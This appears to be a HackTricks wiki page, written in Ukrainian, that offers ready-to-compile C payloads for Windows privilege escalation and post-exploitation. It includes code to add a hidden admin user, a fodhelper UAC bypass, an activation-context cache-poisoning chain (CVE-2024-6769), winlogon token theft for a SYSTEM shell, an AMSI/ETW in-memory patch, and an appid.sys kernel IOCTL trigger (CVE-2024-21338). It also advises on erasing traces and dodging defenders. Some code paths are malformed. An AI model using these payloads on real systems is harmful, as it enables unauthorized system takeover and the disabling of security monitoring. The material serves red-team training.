# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка збирає **невеликі, автономні фрагменти на C**, які корисні під час Windows Local Privilege Escalation або post-exploitation. Кожен payload спроєктовано так, щоб бути **зручним для копіювання/вставки**, вимагати лише Windows API / C runtime і бути сумісним зі збіркою за допомогою `i686-w64-mingw32-gcc` (x86) або `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Ці payloads припускають, що процес уже має мінімальні привілеї, необхідні для виконання дії (наприклад, `SeDebugPrivilege`, `SeImpersonatePrivilege`, або medium-integrity контекст для UAC bypass). Вони призначені для **red-team або CTF сценаріїв**, коли експлуатація вразливості призвела до довільного виконання native коду.

---

## Додати локального користувача з правами адміністратора
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Коли довірений бінарний файл **`fodhelper.exe`** запускається, він опитує наведений нижче шлях реєстру **без фільтрації оператора `DelegateExecute`**. Посадивши нашу команду під цим ключем, атакуючий може обійти UAC *без* запису файлу на диск.

*Шлях реєстру, який опитує `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Мінімальний PoC, що запускає підвищений `cmd.exe`:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Тестовано на Windows 10 22H2 і Windows 11 23H2 (патчі за липень 2025). Обхід все ще працює, бо Microsoft не виправила відсутню перевірку цілісності в шляху `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning все ще працює проти запатчених збірок Windows 10/11, оскільки `ctfmon.exe` запускається як high-integrity trusted UI процес, який без проблем завантажується з підробленого (імпсонованого) диска `C:` викликачем і повторно використовує будь-які перенаправлення DLL, кешовані `CSRSS`. Зловживання виглядає так: перенаправити `C:` на контрольоване атакуючим сховище, підкинути троянізований `msctf.dll`, запустити `ctfmon.exe`, щоб отримати високі привілеї, а потім попросити `CSRSS` закешувати manifest, що перенаправляє DLL, яку використовує автопідвищуваний бінар (наприклад, `fodhelper.exe`), щоб наступний запуск успадкував ваш payload без UAC-підказки.

Практичний робочий процес:
1. Підготуйте фейкове дерево `%SystemRoot%\System32` і скопіюйте легітимний бінар, який плануєте перехопити (часто `ctfmon.exe`).
2. Використайте `DefineDosDevice(DDD_RAW_TARGET_PATH)` для перемапінгу `C:` всередині вашого процесу, зберігаючи `DDD_NO_BROADCAST_SYSTEM`, щоб зміна залишалася локально.
3. Помістіть вашу DLL + manifest у фейкове дерево, викличте `CreateActCtx/ActivateActCtx`, щоб додати manifest у кеш activation-context, потім запустіть автопідвищуваний бінар, щоб він вирішив перенаправлену DLL і прямо завантажив ваш shellcode.
4. Видаліть запис у кеші (`sxstrace ClearCache`) або перезавантажте систему після завершення, щоб стерти сліди атакуючого.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Cleanup tip: after popping SYSTEM, call `sxstrace Trace -logfile %TEMP%\sxstrace.etl` followed by `sxstrace Parse` when testing—if you see your manifest name in the log, defenders can too, so rotate paths each run.

---

## Запустити оболонку SYSTEM через дублікацію токена (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Якщо поточний процес має **обидві** привілеї `SeDebug` та `SeImpersonate` (typical for many service accounts), можна вкрасти токен у `winlogon.exe`, дублювати його та запустити процес з підвищеними правами:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Для докладнішого пояснення того, як це працює, див.:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Патч AMSI & ETW у пам'яті (Defence Evasion)
Більшість сучасних AV/EDR рушіїв покладаються на **AMSI** та **ETW** для аналізу шкідливої активності. Застосування патчів до обох інтерфейсів на ранньому етапі всередині поточного процесу перешкоджає скануванню payloads на основі скриптів (наприклад PowerShell, JScript).
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Патч вище є локальним для процесу; створення нового PowerShell після його виконання запустить його без перевірки AMSI/ETW.*

---

## Створити дочірній процес як Protected Process Light (PPL)
Вкажіть рівень захисту PPL для дочірнього процесу під час створення, використовуючи `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Це документований API і він вдасться лише якщо цільовий образ підписаний для запитуваного класу підписувача (Windows/WindowsLight/Antimalware/LSA/WinTcb).
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Рівні, що найчастіше використовуються:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Перевірте результат за допомогою Process Explorer/Process Hacker, перевіривши стовпець Protection.

---

## Local Service -> Kernel через `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` створює об'єкт пристрою (`\\.\\AppID`), чий smart-hash maintenance IOCTL приймає user-supplied function pointers коли викликач працює як `LOCAL SERVICE`; Lazarus зловживає цим, щоб вимкнути PPL і завантажити довільні драйвери, тому red teams повинні мати готовий trigger для лабораторного використання.

Оперативні нотатки:
- Ви все ще потребуєте токен `LOCAL SERVICE`. Викрадьте його з `Schedule` або `WdiServiceHost`, використовуючи `SeImpersonatePrivilege`, потім impersonate перед зверненням до пристрою, щоб перевірки ACL пройшли.
- IOCTL `0x22A018` очікує struct, що містить два callback pointers (query length + read function). Point both at user-mode stubs that craft a token overwrite or map ring-0 primitives, але зберігайте буфери RWX, щоб KernelPatchGuard не впав посеред ланцюжка.
- Після успіху припиніть impersonation і revert the device handle; defenders тепер шукають несподівані `Device\\AppID` handles, тому закрийте його негайно після отримання привілею.

<details>
<summary>C - Skeleton trigger для зловживання `appid.sys` smart-hash</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Мінімальна правка для weaponized build: відобразіть секцію RWX за допомогою `VirtualAlloc`, скопіюйте туди ваш token duplication stub, встановіть `KernelThunk = section`, і як тільки `DeviceIoControl` повернеться, ви маєте бути SYSTEM навіть під PPL.

---

## Посилання
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – мінімальний PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
